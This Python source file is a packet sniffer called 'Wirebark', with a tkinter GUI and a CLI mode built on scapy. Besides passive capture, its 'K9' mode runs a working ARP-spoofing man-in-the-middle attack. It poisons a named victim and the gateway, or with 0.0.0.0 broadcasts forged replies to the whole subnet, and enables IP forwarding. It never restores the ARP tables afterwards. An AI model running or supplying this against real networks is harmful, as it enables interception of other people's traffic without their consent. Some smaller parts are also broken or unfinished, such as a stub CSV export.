#!/usr/bin/env python3
import os
import sys
import threading
import time
import socket
import struct
import csv
import argparse
import platform
from datetime import datetime
import tkinter as tk
from tkinter import ttk, filedialog, messagebox

from scapy.all import (
    AsyncSniffer, Ether, IP, IPv6, ARP, DNS, UDP, TCP, ICMP,
    get_if_list, get_if_hwaddr, send, sr, wrpcap
)

# Try to import netifaces for a robust gateway lookup.
try:
    import netifaces
    have_netifaces = True
except ImportError:
    have_netifaces = False

# Mapping for IP protocol numbers to names.
ip_protocol_map = {
    1:  "ICMP",
    6:  "TCP",
    17: "UDP"
}


###############################################################################
# Helper Functions
###############################################################################
def enable_ip_forwarding():
    """Enable IP forwarding on Linux systems to help with packet forwarding."""
    if platform.system() == "Linux":
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            print("IP forwarding enabled.")
        except Exception as e:
            print(f"Failed to enable IP forwarding: {e}")
    else:
        print("IP forwarding must be enabled manually on non-Linux systems.")


###############################################################################
# GUI MODE CODE
###############################################################################
class PacketSnifferApp:
    def __init__(self, root, cli_options):
        self.root = root
        self.root.title("Wirebark Packet Sniffer")
        self.captured_packets = []  # List of tuples: (packet info, raw scapy packet)
        self.current_filter = ""
        self.sniffing = False
        self.sniffer = None

        # ARP spoofing thread and stop event (for K9 mode)
        self.arp_thread = None
        self.arp_stop_event = threading.Event()

        # Mode: "puppy" (local filtering) or "k9" (active ARP spoofing)
        self.mode = tk.StringVar(value="puppy")
        self.selected_interface = tk.StringVar(value=cli_options.interface if cli_options.interface else "")
        self.filter_entry_text = tk.StringVar()

        # K9 Mode extra fields: Gateway and Victim IP
        self.gateway_ip = tk.StringVar()
        self.victim_ip = tk.StringVar()

        # Auto Logging options
        self.logging_enabled = tk.BooleanVar(value=not cli_options.no_log)
        self.log_file_path = tk.StringVar(value=cli_options.logfile if cli_options.logfile else "")
        self.log_file = None  # File handle for auto logging
        self.csv_writer = None

        # Theme mode (Light/Dark)
        self.theme_var = tk.StringVar(value="Light")

        # Check for permissions.
        if os.geteuid() != 0:
            messagebox.showwarning("Permission Required",
                                   "Run this app as root/admin to sniff packets and perform ARP spoofing.")

        self.create_widgets()
        # If a network interface was preset, update the gateway field.
        if self.selected_interface.get():
            self.interface_combo.set(self.selected_interface.get())
            self.interface_changed(None)

    def create_widgets(self):
        control_frame = tk.Frame(self.root)
        control_frame.pack(fill=tk.X, padx=5, pady=5)

        # Split the top controls into two rows.
        # ROW 1: Interface, Mode (with K9 fields), Theme, Start/Stop Buttons.
        row1 = tk.Frame(control_frame)
        row1.pack(fill=tk.X, pady=(0, 5))
        # Interface selection.
        tk.Label(row1, text="Interface:").pack(side=tk.LEFT, padx=(0, 5))
        self.interface_combo = ttk.Combobox(row1, textvariable=self.selected_interface, width=12)
        interfaces = get_if_list()
        self.interface_combo['values'] = interfaces
        if not self.selected_interface.get() and interfaces:
            self.interface_combo.current(0)
        self.interface_combo.pack(side=tk.LEFT, padx=5)
        self.interface_combo.bind("<<ComboboxSelected>>", self.interface_changed)

        # Mode selection radio buttons.
        tk.Label(row1, text="Mode:").pack(side=tk.LEFT, padx=(10, 5))
        tk.Radiobutton(row1, text="Puppy", variable=self.mode, value="puppy",
                       command=self.update_mode_ui).pack(side=tk.LEFT)
        tk.Radiobutton(row1, text="K9", variable=self.mode, value="k9",
                       command=self.update_mode_ui).pack(side=tk.LEFT)

        # K9 Mode fields.
        self.k9_frame = tk.Frame(row1)
        tk.Label(self.k9_frame, text="Gateway IP:").pack(side=tk.LEFT, padx=(10, 5))
        self.gateway_entry = tk.Entry(self.k9_frame, textvariable=self.gateway_ip, width=12)
        self.gateway_entry.pack(side=tk.LEFT, padx=5)
        tk.Label(self.k9_frame, text="Victim IP:").pack(side=tk.LEFT, padx=(10, 5))
        self.victim_entry = tk.Entry(self.k9_frame, textvariable=self.victim_ip, width=12)
        self.victim_entry.pack(side=tk.LEFT, padx=5)
        if self.mode.get() == "k9":
            self.k9_frame.pack(side=tk.LEFT)

        # Theme dropdown.
        tk.Label(row1, text="Theme:").pack(side=tk.LEFT, padx=(10, 5))
        theme_menu = tk.OptionMenu(row1, self.theme_var, "Light", "Dark", command=self.change_theme)
        theme_menu.pack(side=tk.LEFT, padx=5)

        # Start and Stop buttons.
        self.start_button = tk.Button(row1, text="Start Sniffing", command=self.start_sniffing)
        self.start_button.pack(side=tk.LEFT, padx=(10, 5))
        self.stop_button = tk.Button(row1, text="Stop Sniffing", command=self.stop_sniffing, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)

        # ROW 2: Filter, Go to Last, Logging, and Export controls.
        row2 = tk.Frame(control_frame)
        row2.pack(fill=tk.X)
        # Filter field and button.
        self.filter_entry = tk.Entry(row2, textvariable=self.filter_entry_text)
        self.filter_entry.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        self.filter_entry.bind("<Return>", lambda e: self.apply_filter())
        self.filter_button = tk.Button(row2, text="Apply Filter", command=self.apply_filter)
        self.filter_button.pack(side=tk.LEFT, padx=5)
        # Go to Last button.
        self.go_last_button = tk.Button(row2, text="Go to Last", command=self.go_to_last)
        self.go_last_button.pack(side=tk.LEFT, padx=5)
        # Auto Logging controls.
        tk.Checkbutton(row2, text="Auto Log", variable=self.logging_enabled).pack(side=tk.LEFT, padx=(10, 5))
        self.log_button = tk.Button(row2, text="Select Log File", command=self.select_log_file)
        self.log_button.pack(side=tk.LEFT, padx=5)
        # Export CSV button.
        self.export_button = tk.Button(row2, text="Export CSV", command=self.export_csv)
        self.export_button.pack(side=tk.LEFT, padx=5)

        # Treeview for packet display.
        self.tree = ttk.Treeview(self.root, columns=("Src IP", "Dst IP", "Protocol", "Summary"), show="headings")
        self.tree.heading("Src IP", text="Source IP")
        self.tree.heading("Dst IP", text="Destination IP")
        self.tree.heading("Protocol", text="Protocol")
        self.tree.heading("Summary", text="Packet Summary")
        self.tree.column("Src IP", width=140)
        self.tree.column("Dst IP", width=140)
        self.tree.column("Protocol", width=120)
        self.tree.column("Summary", width=400)
        self.tree.tag_configure("broadcast", background="lightyellow")
        self.tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.tree.bind("<Double-1>", self.on_double_click)

        # Shortcuts for quick focus and clearing selections.
        self.root.bind("<Control-f>", lambda e: self.filter_entry.focus_set())
        self.root.bind("<Escape>", lambda e: self.tree.selection_remove(self.tree.selection()))

        # Apply initial theme.
        self.change_theme(self.theme_var.get())

    def change_theme(self, theme):
        """Apply the chosen theme to the GUI."""
        default_bg = self.root.cget("bg")
        style = ttk.Style(self.root)
        if theme == "Dark":
            self.root.configure(bg="#2e2e2e")
            style.configure("TFrame", background="#2e2e2e")
            style.configure("TLabel", background="#2e2e2e", foreground="white")
            style.configure("TButton", background="#444444", foreground="white")
            style.configure("TCombobox", fieldbackground="#3e3e3e", background="#2e2e2e", foreground="white")
            style.configure("TEntry", fieldbackground="#3e3e3e", foreground="white")
            style.configure("Treeview", background="#3e3e3e", foreground="white", fieldbackground="#3e3e3e")
        else:
            self.root.configure(bg=default_bg)
            style.configure("TFrame", background=default_bg)
            style.configure("TLabel", background=default_bg, foreground="black")
            style.configure("TButton", background=default_bg, foreground="black")
            style.configure("TCombobox", fieldbackground="white", background=default_bg, foreground="black")
            style.configure("TEntry", fieldbackground="white", foreground="black")
            style.configure("Treeview", background="white", foreground="black", fieldbackground="white")
        self.root.update_idletasks()

    def interface_changed(self, event):
        """When an interface is selected, update the Gateway field for K9 mode."""
        iface = self.selected_interface.get()
        gw = self.get_default_gateway(iface)
        if gw:
            self.gateway_ip.set(gw)

    def get_default_gateway(self, iface):
        """Retrieve the default gateway for a given interface.
           Uses netifaces if available; otherwise falls back to /proc/net/route (Linux only)."""
        if have_netifaces:
            try:
                gateways = netifaces.gateways()
                default_gateway = gateways.get('default', {}).get(netifaces.AF_INET)
                if default_gateway and default_gateway[1] == iface:
                    return default_gateway[0]
            except Exception:
                pass
        try:
            with open("/proc/net/route") as f:
                next(f)  # Skip header.
                for line in f:
                    fields = line.strip().split()
                    if fields[0] != iface:
                        continue
                    if fields[1] != "00000000":
                        continue
                    try:
                        gw = socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
                        return gw
                    except Exception:
                        return None
        except Exception:
            return None
        return None

    def update_mode_ui(self):
        """Show/hide K9-specific fields based on mode selection."""
        if self.mode.get() == "k9":
            self.k9_frame.pack(side=tk.LEFT)
            iface = self.selected_interface.get()
            gw = self.get_default_gateway(iface)
            if gw:
                self.gateway_ip.set(gw)
        else:
            self.k9_frame.forget()

    def get_local_ip(self, iface):
        """Retrieve the local IP address for the selected interface."""
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
        except Exception:
            local_ip = "127.0.0.1"
        finally:
            s.close()
        return local_ip

    def get_mac(self, ip, iface):
        """Obtain the MAC address for an IP using an ARP request."""
        ans, _ = sr(ARP(pdst=ip), iface=iface, timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
        return None

    def select_log_file(self):
        """Let the user select (or create) a CSV file for auto logging."""
        file_path = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv")])
        if file_path:
            self.log_file_path.set(file_path)
            messagebox.showinfo("Log File Set", f"Auto log file will be:\n{file_path}")

    def go_to_last(self):
        children = self.tree.get_children()
        if children:
            self.tree.see(children[-1])

    def on_double_click(self, event):
        """Open a detail view for the double-clicked packet."""
        selected = self.tree.selection()
        if not selected:
            return
        item_id = self.tree.item(selected[0], 'text')
        if not item_id.isdigit():
            return
        index = int(item_id)
        info, raw_packet = self.captured_packets[index]
        detail_win = tk.Toplevel(self.root)
        detail_win.title("Packet Details")
        for label in [
            f"Source MAC: {info.get('src_mac', 'N/A')}",
            f"Destination MAC: {info.get('dst_mac', 'N/A')}",
            f"Source IP: {info.get('src_ip', 'N/A')}",
            f"Destination IP: {info.get('dst_ip', 'N/A')}",
            f"Protocol: {info.get('protocol', 'Unknown')}"
        ]:
            tk.Label(detail_win, text=label).pack(anchor="w", padx=5, pady=2)
        text_frame = tk.Frame(detail_win)
        text_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        scrollbar = tk.Scrollbar(text_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        detail_text = tk.Text(text_frame, wrap="none", yscrollcommand=scrollbar.set)
        detail_text.pack(fill=tk.BOTH, expand=True)
        scrollbar.config(command=detail_text.yview)
        detail_text.insert(tk.END, raw_packet.show(dump=True))
        detail_text.config(state=tk.DISABLED)

    def start_sniffing(self):
        iface = self.selected_interface.get()
        if not iface:
            messagebox.showerror("No Interface", "Please select a network interface.")
            return

        # Clear previous packet data.
        self.captured_packets.clear()
        for item in self.tree.get_children():
            self.tree.delete(item)

        # Setup auto logging if enabled.
        if self.logging_enabled.get():
            log_path = self.log_file_path.get()
            if not log_path:
                messagebox.showerror("No Log File", "Please select a log file for auto logging.")
                return
            try:
                file_exists = os.path.isfile(log_path)
                self.log_file = open(log_path, 'w', newline='')
                self.csv_writer = csv.writer(self.log_file)
                if not file_exists:
                    self.csv_writer.writerow(["Timestamp", "Index", "Source IP", "Destination IP", "Protocol", "Summary"])
            except Exception as e:
                messagebox.showerror("Log File Error", f"Error opening log file:\n{e}")
                self.log_file = None
                self.csv_writer = None

        # In K9 mode, start ARP spoofing and enable IP forwarding.
        if self.mode.get() == "k9":
            enable_ip_forwarding()
            gateway = self.gateway_ip.get().strip()
            victim = self.victim_ip.get().strip()
            if not gateway or not victim:
                messagebox.showerror("Missing Info", "Please provide both Gateway and Victim IP addresses for K9 Mode.")
                return
            our_mac = get_if_hwaddr(iface)
            our_ip = self.get_local_ip(iface)
            gateway_mac = self.get_mac(gateway, iface)
            if not gateway_mac:
                messagebox.showerror("ARP Error", f"Could not determine MAC address for Gateway ({gateway}).")
                return
            if victim != "0.0.0.0":
                victim_mac = self.get_mac(victim, iface)
                if not victim_mac:
                    messagebox.showerror("ARP Error", f"Could not determine MAC address for Victim ({victim}).")
                    return
            else:
                victim_mac = None  # Wildcard mode.
            self.arp_stop_event.clear()
            self.arp_thread = threading.Thread(
                target=self.arp_spoof,
                args=(gateway, gateway_mac, victim, victim_mac, our_mac),
                daemon=True
            )
            self.arp_thread.start()

        # Start asynchronous packet sniffing.
        self.sniffer = AsyncSniffer(iface=iface, prn=self.handle_new_packet, store=False)
        self.sniffer.start()
        self.sniffing = True
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

    def stop_sniffing(self):
        if self.sniffer:
            self.sniffer.stop()
        self.sniffing = False
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.NORMAL)
        # Stop ARP spoofing if running.
        if self.mode.get() == "k9" and self.arp_thread:
            self.arp_stop_event.set()
            self.arp_thread.join()
            self.arp_thread = None
        # Close the logging file if open.
        if self.log_file:
            self.log_file.close()
            self.log_file = None

    def arp_spoof(self, gateway_ip, gateway_mac, victim_ip, victim_mac, our_mac):
        """
        ARP spoofing thread:
          - In standard K9 mode, spoof both victim and gateway.
          - If victim_ip is "0.0.0.0", send broadcast ARP replies.
        """
        while not self.arp_stop_event.is_set():
            if victim_ip == "0.0.0.0":
                arp_to_all = ARP(op=2, pdst="255.255.255.255", psrc=gateway_ip, hwsrc=our_mac)
                send(arp_to_all, verbose=False)
            else:
                arp_to_victim = ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=our_mac)
                arp_to_gateway = ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=our_mac)
                send(arp_to_victim, verbose=False)
                send(arp_to_gateway, verbose=False)
            time.sleep(2)

    def handle_new_packet(self, packet):
        info = self.get_packet_info(packet)
        # In Puppy mode, show only packets involving the local machine.
        if self.mode.get() == "puppy":
            local_ip = self.get_local_ip(self.selected_interface.get())
            if local_ip not in (info.get('src_ip', ''), info.get('dst_ip', '')):
                return

        self.captured_packets.append((info, packet))
        if self.packet_matches_filter(info, self.current_filter):
            index = len(self.captured_packets) - 1
            tags = ("broadcast",) if info.get("dst_ip", "").endswith(".255") else ()
            self.tree.insert("", tk.END, text=str(index), values=(
                info.get('src_ip', 'N/A'),
                info.get('dst_ip', 'N/A'),
                info.get('protocol', 'Unknown'),
                info.get('summary', '')
            ), tags=tags)
            # Auto log the packet if enabled.
            if self.logging_enabled.get() and self.csv_writer:
                try:
                    self.csv_writer.writerow([
                        datetime.now().isoformat(),
                        index,
                        info.get('src_ip', 'N/A'),
                        info.get('dst_ip', 'N/A'),
                        info.get('protocol', 'Unknown'),
                        info.get('summary', '')
                    ])
                    if self.log_file:
                        self.log_file.flush()
                except Exception as e:
                    print(f"Error logging packet: {e}")

    def apply_filter(self):
        self.current_filter = self.filter_entry.get().strip().lower()
        for item in self.tree.get_children():
            self.tree.delete(item)
        for idx, (info, _) in enumerate(self.captured_packets):
            if self.packet_matches_filter(info, self.current_filter):
                tags = ("broadcast",) if info.get("dst_ip", "").endswith(".255") else ()
                self.tree.insert("", tk.END, text=str(idx), values=(
                    info.get('src_ip', 'N/A'),
                    info.get('dst_ip', 'N/A'),
                    info.get('protocol', 'Unknown'),
                    info.get('summary', '')
                ), tags=tags)

    def packet_matches_filter(self, info, filter_text):
        """Support field-specific filtering (e.g. protocol:tcp) or a search across all fields."""
        if not filter_text:
            return True
        tokens = filter_text.split()
        for token in tokens:
            if ':' in token:
                key, val = token.split(':', 1)
                if val not in info.get(f"{key}_ip", "").lower() and val not in info.get(key, "").lower():
                    return False
            else:
                combined = " ".join([
                    info.get('src_mac', '').lower(),
                    info.get('dst_mac', '').lower(),
                    info.get('src_ip', '').lower(),
                    info.get('dst_ip', '').lower(),
                    info.get('protocol', '').lower(),
                    info.get('summary', '').lower()
                ])
                if token not in combined:
                    return False
        return True

    def get_packet_info(self, packet):
        info = {}
        if Ether in packet:
            info['src_mac'] = packet[Ether].src
            info['dst_mac'] = packet[Ether].dst
        else:
            info['src_mac'] = "N/A"
            info['dst_mac'] = "N/A"
        if ARP in packet:
            info['protocol'] = "ARP"
            info['src_ip'] = packet[ARP].psrc
            info['dst_ip'] = packet[ARP].pdst
        elif IPv6 in packet:
            info['protocol'] = "IPv6"
            info['src_ip'] = packet[IPv6].src
            info['dst_ip'] = packet[IPv6].dst
        elif IP in packet:
            info['src_ip'] = packet[IP].src
            info['dst_ip'] = packet[IP].dst
            if DNS in packet:
                info['protocol'] = "DNS"
            elif ICMP in packet:
                info['protocol'] = "ICMP"
            elif UDP in packet:
                sport, dport = packet[UDP].sport, packet[UDP].dport
                if sport == 5353 or dport == 5353:
                    info['protocol'] = "mDNS"
                elif sport == 1900 or dport == 1900:
                    info['protocol'] = "SSDP"
                elif sport == 137 or dport == 137:
                    info['protocol'] = "NBNS"
                elif sport == 5355 or dport == 5355:
                    info['protocol'] = "LLMNR"
                else:
                    info['protocol'] = ip_protocol_map.get(packet[IP].proto, f"UDP({packet[IP].proto})")
            elif TCP in packet:
                info['protocol'] = ip_protocol_map.get(packet[IP].proto, f"TCP({packet[IP].proto})")
            else:
                info['protocol'] = ip_protocol_map.get(packet[IP].proto, f"IP({packet[IP].proto})")
        else:
            info['protocol'] = "Unknown"
            info['src_ip'] = "N/A"
            info['dst_ip'] = "N/A"
        info['summary'] = packet.summary()
        return info

    def export_csv(self):
        print("Exporting packets to CSV...")
        # CSV export functionality can be added here.
        # Currently, auto logging writes packets to the log file in real time.

###############################################################################
# CLI MODE CODE
###############################################################################
def run_cli(args):
    # Ensure running as root.
    if os.geteuid() != 0:
        sys.exit("This program requires root privileges. Please run as sudo/root.")
    # If requested, list available interfaces.
    if args.list:
        print("Available interfaces:")
        for iface in get_if_list():
            print(f" - {iface}")
        sys.exit(0)
    interface = args.interface
    if not interface:
        sys.exit("Error: --interface is required in CLI mode.")
    if args.output:
        output = args.output
    else:
        now = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        output = f"wirebark_{interface}_{now}.pcap"
    if not args.quiet:
        print(f"Starting capture on {interface}... (Count: {args.count if args.count else 'Infinite'}, "
              f"Time: {args.time if args.time else 'Unlimited'})")
    # Use AsyncSniffer with store=True to capture packets.
    sniffer = AsyncSniffer(iface=interface, count=args.count, timeout=args.time,
                           prn=(lambda pkt: print(pkt.summary())) if not args.quiet else None, store=True)
    sniffer.start()
    sniffer.join()  # Block until capture is done.
    packets = sniffer.results
    wrpcap(output, packets)
    if not args.quiet:
        print(f"\nCapture saved to: {output}")

###############################################################################
# MAIN: Parse arguments and select mode
###############################################################################
def main():
    parser = argparse.ArgumentParser(description="Wirebark Packet Sniffer")
    parser.add_argument("--cli", action="store_true", help="Run in CLI mode (instead of GUI).")
    # Common arguments (available in both modes)
    parser.add_argument("--interface", help="Preselect network interface (e.g. eth0, wlan0).")
    parser.add_argument("--logfile", help="Log file for auto logging (CSV).")
    parser.add_argument("--no-log", action="store_true", help="Disable auto logging in GUI mode.")
    # CLI-only arguments
    parser.add_argument("-c", "--count", type=int, help="Number of packets to capture in CLI mode.")
    parser.add_argument("-t", "--time", type=int, help="Duration (in seconds) to capture packets in CLI mode.")
    parser.add_argument("-o", "--output", help="Output pcap file name (CLI mode).")
    parser.add_argument("-q", "--quiet", action="store_true", help="Suppress live packet output (CLI mode).")
    parser.add_argument("--list", action="store_true", help="List available network interfaces and exit (CLI mode).")
    args = parser.parse_args()

    if args.cli:
        run_cli(args)
    else:
        root = tk.Tk()
        app = PacketSnifferApp(root, args)
        root.mainloop()

if __name__ == "__main__":
    main()
